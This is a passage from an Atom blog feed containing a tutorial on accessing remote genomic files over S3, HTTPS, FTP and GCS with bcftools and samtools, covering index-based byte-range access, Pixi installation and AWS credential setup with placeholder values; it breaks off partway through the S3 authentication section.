<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="atom.xsl"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://riverxdata.github.io/river-docs/blog</id>
    <title>RiverXData Blog</title>
    <updated>2026-02-16T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://riverxdata.github.io/river-docs/blog"/>
    <subtitle>RiverXData Blog</subtitle>
    <icon>https://riverxdata.github.io/river-docs/img/logo-riverxdata-02.png</icon>
    <entry>
        <title type="html"><![CDATA[Working with Remote Files using bcftools and samtools (HTSlib)]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools</id>
        <link href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools"/>
        <updated>2026-02-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[HTSlib-based tools like bcftools and samtools provide powerful capabilities for working with genomic data stored on remote servers. Whether your data is in AWS S3, accessible via FTP, or hosted on HTTPS endpoints, these tools allow you to efficiently query and subset remote files without downloading entire datasets. This guide covers authentication, remote file access patterns, and practical workflows.]]></summary>
        <content type="html"><![CDATA[<p>HTSlib-based tools like <code>bcftools</code> and <code>samtools</code> provide powerful capabilities for working with genomic data stored on remote servers. Whether your data is in AWS S3, accessible via FTP, or hosted on HTTPS endpoints, these tools allow you to efficiently query and subset remote files without downloading entire datasets. This guide covers authentication, remote file access patterns, and practical workflows.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-how-htslib-handles-remote-files-with-random-access">1. How HTSlib Handles Remote Files with Random Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#1-how-htslib-handles-remote-files-with-random-access" class="hash-link" aria-label="Direct link to 1. How HTSlib Handles Remote Files with Random Access" title="Direct link to 1. How HTSlib Handles Remote Files with Random Access" translate="no">​</a></h2>
<p>HTSlib is a C library that powers many genomic tools. Tools built on HTSlib—including <code>bcftools</code>, <code>samtools</code>, <code>tabix</code>, and others—inherit native support for <strong>remote file access via random access queries</strong>. This section explains how HTSlib works with remote files and which protocols are supported.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-random-access-mechanism-the-foundation">1.1 Random Access Mechanism: The Foundation<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#11-random-access-mechanism-the-foundation" class="hash-link" aria-label="Direct link to 1.1 Random Access Mechanism: The Foundation" title="Direct link to 1.1 Random Access Mechanism: The Foundation" translate="no">​</a></h3>
<p>HTSlib enables efficient remote file access through a <strong>byte-range request mechanism</strong>. Instead of downloading entire files, it uses file indexes to determine exact byte positions and requests only those bytes from the remote server.</p>
<p><strong>How it works:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">User Request:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools view s3://bucket/variants.vcf.gz chr1:1000-2000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">HTSlib Process:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1. Reads index file (.vcf.gz.tbi) to find byte ranges</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">2. Index lookup: "chr1:1000-2000 is at bytes 5000-15000"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">3. Sends byte-range request to remote server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">4. Remote server returns ONLY requested bytes (10KB, not 1GB!)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">5. HTSlib decompresses partial data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">6. Returns matching variants to user</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Result: 10KB downloaded instead of 1GB</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Time: 1-5 seconds instead of 5-30 minutes</span><br></span></code></pre></div></div>
<p><strong>Critical requirement: Indexed files</strong> (<code>.tbi</code>, <code>.bai</code>, <code>.csi</code>)</p>
<ul>
<li class="">Without index: Must download entire file from start (fails on large files)</li>
<li class="">With index: Downloads only necessary bytes (efficient and fast)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="12-all-supported-url-schemes">1.2 All Supported URL Schemes<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#12-all-supported-url-schemes" class="hash-link" aria-label="Direct link to 1.2 All Supported URL Schemes" title="Direct link to 1.2 All Supported URL Schemes" translate="no">​</a></h3>
<p>HTSlib supports a comprehensive list of protocols via <code>libcurl</code>. Check your installation:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># View all supported protocols</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-A</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"HTSlib URL"</span><br></span></code></pre></div></div>
<p><strong>Complete output example:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">HTSlib URL scheme handlers present:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    built-in:        file, preload, data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Google Cloud:    gs+http, gs+https, gs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    libcurl:         gophers, smtp, wss, smb, rtsp, tftp, pop3, smbs, imaps, pop3s, ws, ftps, ftp, gopher, imap, http, https, sftp, smtps, scp, dict, mqtt, telnet</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Amazon S3:       s3+https, s3, s3+http</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    crypt4gh:        crypt4gh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    mem:             mem</span><br></span></code></pre></div></div>
<p><strong>Protocol categories:</strong></p>
<table><thead><tr><th>Category</th><th>Protocols</th><th>Typical Use</th></tr></thead><tbody><tr><td><strong>Built-in</strong></td><td>file, preload, data</td><td>Local files, pipes</td></tr><tr><td><strong>Cloud Storage</strong></td><td>s3://, gs://</td><td>AWS, Google Cloud</td></tr><tr><td><strong>HTTP-based</strong></td><td>http://, https://, ftps://</td><td>Web servers, FTP over SSL</td></tr><tr><td><strong>Other</strong></td><td>ftp://, sftp://, scp://, smb://</td><td>Traditional file servers</td></tr><tr><td><strong>Specialized</strong></td><td>mqtt, dict, imap, etc</td><td>Not typical for genomics</td></tr></tbody></table>
<p><strong>Note on protocol coverage:</strong> This blog focuses on the most common protocols for bioinformatics: <strong>S3, HTTPS, FTP, and GCS</strong>. Many other protocols are available but less commonly used for genomic data.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="13-typical-bioinformatics-protocols-covered-in-this-blog">1.3 Typical Bioinformatics Protocols (Covered in This Blog)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#13-typical-bioinformatics-protocols-covered-in-this-blog" class="hash-link" aria-label="Direct link to 1.3 Typical Bioinformatics Protocols (Covered in This Blog)" title="Direct link to 1.3 Typical Bioinformatics Protocols (Covered in This Blog)" translate="no">​</a></h3>
<p>The following protocols are widely used for storing and accessing genomic data:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="s3-amazon-s3-and-compatible">S3 (Amazon S3 and compatible)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#s3-amazon-s3-and-compatible" class="hash-link" aria-label="Direct link to S3 (Amazon S3 and compatible)" title="Direct link to S3 (Amazon S3 and compatible)" translate="no">​</a></h4>
<ul>
<li class=""><strong>URL scheme</strong>: <code>s3://bucket-name/path/file.vcf.gz</code></li>
<li class=""><strong>Use case</strong>: Cloud-based genomic repositories, AWS-hosted data</li>
<li class=""><strong>Random access</strong>: Via byte-range requests, AWS SDK for auth</li>
<li class=""><strong>Speed</strong>: Fastest (typically &lt;1 second for indexed queries)</li>
<li class=""><strong>See section</strong>: 2 - S3 Remote File Access</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="https-web-servers">HTTPS (Web servers)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#https-web-servers" class="hash-link" aria-label="Direct link to HTTPS (Web servers)" title="Direct link to HTTPS (Web servers)" translate="no">​</a></h4>
<ul>
<li class=""><strong>URL scheme</strong>: <code>https://server.com/path/file.vcf.gz</code></li>
<li class=""><strong>Use case</strong>: Public databases (NCBI, Ensembl), institutional servers</li>
<li class=""><strong>Random access</strong>: Via HTTP Range header (206 Partial Content)</li>
<li class=""><strong>Speed</strong>: Fast (1-2 seconds for indexed queries)</li>
<li class=""><strong>See section</strong>: 4 - HTTPS Remote File Access</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="ftp-file-transfer-protocol">FTP (File Transfer Protocol)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#ftp-file-transfer-protocol" class="hash-link" aria-label="Direct link to FTP (File Transfer Protocol)" title="Direct link to FTP (File Transfer Protocol)" translate="no">​</a></h4>
<ul>
<li class=""><strong>URL scheme</strong>: <code>ftp://server.com/path/file.vcf.gz</code></li>
<li class=""><strong>Use case</strong>: Legacy databases, some public repositories</li>
<li class=""><strong>Random access</strong>: Via FTP REST command for seeking</li>
<li class=""><strong>Speed</strong>: Slower (3-5 seconds for indexed queries)</li>
<li class=""><strong>See section</strong>: 3 - FTP Remote File Access</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="gcs-google-cloud-storage">GCS (Google Cloud Storage)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#gcs-google-cloud-storage" class="hash-link" aria-label="Direct link to GCS (Google Cloud Storage)" title="Direct link to GCS (Google Cloud Storage)" translate="no">​</a></h4>
<ul>
<li class=""><strong>URL scheme</strong>: <code>gs://bucket-name/path/file.vcf.gz</code></li>
<li class=""><strong>Use case</strong>: Google Cloud-hosted genomic data</li>
<li class=""><strong>Random access</strong>: Similar to S3 (byte-range requests)</li>
<li class=""><strong>Speed</strong>: Fast (typically &lt;1 second for indexed queries)</li>
<li class=""><strong>Note</strong>: Requires Google Cloud SDK credentials</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="14-key-advantages-of-remote-access">1.4 Key Advantages of Remote Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#14-key-advantages-of-remote-access" class="hash-link" aria-label="Direct link to 1.4 Key Advantages of Remote Access" title="Direct link to 1.4 Key Advantages of Remote Access" translate="no">​</a></h3>
<ul>
<li class=""><strong>Avoid large downloads</strong>: Query specific regions without transferring entire files</li>
<li class=""><strong>Cost efficiency</strong>: Pay only for data you access, not storage</li>
<li class=""><strong>Scalability</strong>: Work with datasets larger than local disk space</li>
<li class=""><strong>Collaboration</strong>: Reference shared datasets directly without copying</li>
<li class=""><strong>Real-time access</strong>: Always work with latest version of data</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="15-performance-considerations-why-indexes-matter">1.5 Performance Considerations: Why Indexes Matter<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#15-performance-considerations-why-indexes-matter" class="hash-link" aria-label="Direct link to 1.5 Performance Considerations: Why Indexes Matter" title="Direct link to 1.5 Performance Considerations: Why Indexes Matter" translate="no">​</a></h3>
<p>Remote file access requires indexed files for efficient region-based queries:</p>
<ul>
<li class=""><strong>VCF files</strong>: Must have <code>.vcf.gz.tbi</code> index</li>
<li class=""><strong>BAM files</strong>: Must have <code>.bam.bai</code> index</li>
<li class=""><strong>BCF files</strong>: Must have <code>.bcf.csi</code> index</li>
</ul>
<p><strong>Bandwidth comparison for 1GB VCF file querying chr1:1-100000:</strong></p>
<table><thead><tr><th>Scenario</th><th>Bytes Transferred</th><th>Time</th><th>Method</th></tr></thead><tbody><tr><td><strong>Indexed S3</strong></td><td>~700KB</td><td>&lt;1 second</td><td>Byte-range request</td></tr><tr><td><strong>Indexed HTTPS</strong></td><td>~700KB</td><td>1-2 seconds</td><td>HTTP Range header</td></tr><tr><td><strong>Indexed FTP</strong></td><td>~700KB</td><td>3-5 seconds</td><td>FTP REST seek</td></tr><tr><td><strong>Unindexed remote</strong></td><td>1000MB+</td><td>5-30 minutes</td><td>Sequential download</td></tr><tr><td><strong>Local indexed file</strong></td><td>~700KB</td><td>&lt;0.5 seconds</td><td>Direct file seek</td></tr></tbody></table>
<p><strong>Critical insight</strong>: Indexed remote access downloads only 0.07% of file size!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="16-setting-up-bcftools-and-samtools-with-pixi">1.6 Setting Up bcftools and samtools with Pixi<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#16-setting-up-bcftools-and-samtools-with-pixi" class="hash-link" aria-label="Direct link to 1.6 Setting Up bcftools and samtools with Pixi" title="Direct link to 1.6 Setting Up bcftools and samtools with Pixi" translate="no">​</a></h3>
<p>The easiest way to install bcftools and samtools with full remote file support is using Pixi with the <code>conda-forge</code> and <code>bioconda</code> channels. These channels include pre-compiled binaries with S3, FTP, and HTTPS support enabled in HTSlib.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="installation-steps">Installation Steps<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#installation-steps" class="hash-link" aria-label="Direct link to Installation Steps" title="Direct link to Installation Steps" translate="no">​</a></h4>
<p>Create a new directory for your project and initialize a Pixi environment:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create project directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> ~/htslib-project </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> ~/htslib-project</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Initialize Pixi with conda-forge and bioconda channels</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi init </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> conda-forge </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--channel</span><span class="token plain"> bioconda </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add bcftools and samtools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> bcftools samtools</span><br></span></code></pre></div></div>
<p>This creates a <code>pixi.toml</code> file:</p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[workspace]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">channels = ["conda-forge", "bioconda"]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">name = "htslib-project"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">platforms = ["linux-64"]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">version = "0.1.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[dependencies]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools = "&gt;=1.23,&lt;2"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools = "&gt;=1.23,&lt;2"</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="verify-installation">Verify Installation<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#verify-installation" class="hash-link" aria-label="Direct link to Verify Installation" title="Direct link to Verify Installation" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run bcftools version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run samtools version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p>Both tools will report HTSlib features including S3, GCS, and libcurl support:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools 1.23</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Using htslib 1.23</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Samtools 1.23</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">HTSlib compilation details:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Features:       build=configure libcurl=yes S3=yes GCS=yes ...</span><br></span></code></pre></div></div>
<p>The key line is <code>S3=yes</code> indicating S3 support is enabled.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-pixi-for-remote-file-access">Why Pixi for Remote File Access?<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#why-pixi-for-remote-file-access" class="hash-link" aria-label="Direct link to Why Pixi for Remote File Access?" title="Direct link to Why Pixi for Remote File Access?" translate="no">​</a></h4>
<ul>
<li class=""><strong>Pre-compiled with remote support</strong>: Bioconda packages include HTSlib compiled with libcurl, S3, and GCS support</li>
<li class=""><strong>Easy dependency management</strong>: All required libraries included automatically</li>
<li class=""><strong>Reproducible environments</strong>: <code>pixi.lock</code> ensures the same versions across machines</li>
<li class=""><strong>No system-wide installation</strong>: Keep tools isolated in your project environment</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="17-protocol-verification-http-range-requests">1.7 Protocol Verification: HTTP Range Requests<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#17-protocol-verification-http-range-requests" class="hash-link" aria-label="Direct link to 1.7 Protocol Verification: HTTP Range Requests" title="Direct link to 1.7 Protocol Verification: HTTP Range Requests" translate="no">​</a></h3>
<p>For HTTPS/HTTP remote access to work efficiently, the server must support HTTP Range Requests. Verify this before relying on remote queries:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test if server supports Range Requests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-I</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Range: bytes=0-500"</span><span class="token plain"> https://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/00-common_all_papu.vcf.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Expected response: HTTP/1.1 206 Partial Content</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># This means byte-range requests work! ✓</span><br></span></code></pre></div></div>
<p>Response headers will show:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">HTTP/1.1 206 Partial Content      ← supports Range requests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Accept-Ranges: bytes              ← confirms support</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Content-Length: 501               ← returns partial content</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-s3-remote-file-access">2. S3 Remote File Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#2-s3-remote-file-access" class="hash-link" aria-label="Direct link to 2. S3 Remote File Access" title="Direct link to 2. S3 Remote File Access" translate="no">​</a></h2>
<p>AWS S3 is a common repository for genomic datasets. HTSlib supports S3 through the <code>s3://</code> protocol.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="21-s3-authentication">2.1 S3 Authentication<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#21-s3-authentication" class="hash-link" aria-label="Direct link to 2.1 S3 Authentication" title="Direct link to 2.1 S3 Authentication" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-aws-credentials">Using AWS Credentials<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#using-aws-credentials" class="hash-link" aria-label="Direct link to Using AWS Credentials" title="Direct link to Using AWS Credentials" translate="no">​</a></h4>
<p>Set AWS credentials as environment variables:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_ACCESS_KEY_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_access_key"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_SECRET_ACCESS_KEY</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_secret_key"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">AWS_DEFAULT_REGION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"us-east-1"</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-aws-iam-roles-ec2-instances">Using AWS IAM Roles (EC2 Instances)<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#using-aws-iam-roles-ec2-instances" class="hash-link" aria-label="Direct link to Using AWS IAM Roles (EC2 Instances)" title="Direct link to Using AWS IAM Roles (EC2 Instances)" translate="no">​</a></h4>
<p>If running on EC2 with an IAM role attached, HTSlib automatically uses the role's credentials—no environment variables needed.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-aws-cli-configuration">Using AWS CLI Configuration<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#using-aws-cli-configuration" class="hash-link" aria-label="Direct link to Using AWS CLI Configuration" title="Direct link to Using AWS CLI Configuration" translate="no">​</a></h4>
<p>HTSlib respects <code>~/.aws/credentials</code> and <code>~/.aws/config</code>:</p>
